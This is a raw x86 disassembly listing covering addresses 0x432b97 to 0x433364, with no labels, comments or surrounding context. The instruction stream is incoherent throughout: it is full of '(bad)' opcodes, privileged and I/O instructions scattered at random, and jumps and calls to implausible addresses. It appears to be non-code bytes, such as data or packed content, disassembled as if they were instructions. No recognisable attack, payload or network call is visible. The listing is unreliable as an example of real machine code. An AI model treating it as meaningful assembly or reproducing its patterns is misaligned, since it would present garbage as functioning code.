  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
